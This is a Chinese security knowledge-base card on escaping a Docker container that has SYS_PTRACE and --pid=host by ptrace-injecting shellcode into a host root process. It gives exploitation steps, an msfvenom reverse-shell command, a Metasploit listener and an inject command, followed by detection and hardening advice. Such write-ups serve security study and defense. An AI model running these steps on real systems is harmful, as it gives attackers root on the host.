---
id: cloud-container-sys-ptrace-pid-host-process-injection-escape
title: 容器同时持有 SYS_PTRACE 能力与 --pid=host 共享进程命名空间时，ptrace 注入宿主机 root 进程弹 shell 逃逸
type: scenario
domain: cloud
path: cloud/container
technique: sys-ptrace-pid-host-process-injection-container-escape
tags:
- cloud
- container
- docker
- escape
- ptrace
- process-injection
- pid-host
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-34
  verified_at: '2026-11-08T17:54:17+08:00'
  notes: 已对照原文与图核对：cap_sys_ptrace判定、ps看宿主dockerd、infect.c编译注入PID 1183940、msf session打开列宿主机目录均有截图佐证；不依赖挂载，与procfs/privileged/socket逃逸机制不同；cgroup v1实验失败未写卡正确
url: /docs/cloud/container/cloud-container-sys-ptrace-pid-host-process-injection-escape/
draft: false
kb_aliases:
- SYS_PTRACE 逃逸
- pid=host 进程注入
- ptrace 注入宿主进程
---

## 一句话结论

容器以 `--pid=host --cap-add=SYS_PTRACE` 启动时，容器内 `ps -ef` 能看到宿主机全部进程，用 infect.c（PTRACE_ATTACH 后向目标 RIP 写入 msfvenom 反弹 shellcode 再 DETACH）注入宿主机 root 进程，msf handler 即收到宿主机 shell，直接逃逸。

## 原理

- `--pid=host` 取消 PID 命名空间隔离，容器与宿主机共享进程视图；`cap_sys_ptrace` 赋予 ptrace 系统调用权限，二者组合意味着容器内 root 可 attach 宿主机任意同 uid 进程。
- infect.c 流程：`PTRACE_ATTACH` 目标 PID → `wait` → `PTRACE_GETREGS` 取寄存器 → 把 shellcode 逐字 `PTRACE_POKETEXT` 写到当前 RIP 位置 → RIP 前移 2 字节（跳过原指令前缀）→ `PTRACE_SETREGS` 回写 → `PTRACE_DETACH` 恢复运行，目标进程立即执行注入的反弹 shellcode。
- shellcode 由 `msfvenom -p linux/x64/shell_reverse_tcp -f c` 生成替换 infect.c 中的默认段；注入目标是宿主机上 root 的长期存活进程（如 /bin/bash 会话、常驻服务进程）。

## 触发条件

- 容器具备 SYS_PTRACE capability（`capsh --print | grep cap_sys_ptrace` 有输出）。
- 与宿主机共享 PID 命名空间（`ps aux | grep dockerd` 能看到宿主 dockerd 进程）。
- 容器内为 root（ptrace 同 uid 限制）。

## 利用步骤

1. `capsh --print | grep cap_sys_ptrace` 确认能力；`ps aux | grep dockerd` 确认共享 PID 命名空间。
2. msfvenom 生成 shellcode 替换 infect.c 中 `shellcode` 数组，容器内 `gcc inject.c -o inject && chmod 777 inject`。
3. `ps -ef` 选一个宿主机 root 进程 PID（原文选 /bin/bash，PID 1183940）。
4. msf `use multi/handler` 配同 payload 监听 4567。
5. `./inject <pid>`：输出 Tracing/Injecting shell code/Run it! 后，msf 打开 session，`ls` 验证已是宿主机文件系统。

## PoC

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4567 -f c
./inject 1183940
```

## 变体与关联

- 同思路可用 gdb/processhollowing 等替代 infect.c；注入目标换成宿主机高权限服务进程亦可。
- 与特权模式、core_pattern 等逃逸同属「错误授权容器」家族，区别在于本卡依赖 capability+命名空间组合而非挂载。

## 检测与防御

- 业务容器默认不加 SYS_PTRACE、不用 --pid=host；编排文件审计这两个参数。
- 监控容器内进程对宿主进程的 ptrace 调用（auditd ptrace syscall）、异常外连。
